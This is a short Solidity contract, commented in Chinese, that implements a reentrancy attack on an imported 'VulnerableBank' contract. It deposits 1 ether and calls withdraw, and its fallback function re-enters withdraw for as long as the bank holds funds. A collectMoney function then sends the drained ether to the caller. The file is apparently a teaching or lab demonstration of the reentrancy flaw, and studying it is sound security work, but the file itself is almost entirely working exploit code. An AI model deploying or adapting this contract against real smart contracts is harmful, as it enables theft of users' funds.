// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableBank.sol";

contract Attack {
    VulnerableBank public bank;

    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }

    // 当收到钱时，这个函数会自动触发
    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(); // ⬅️ 递归重入！
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // 提取黑客合约抢到的钱
    function collectMoney() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}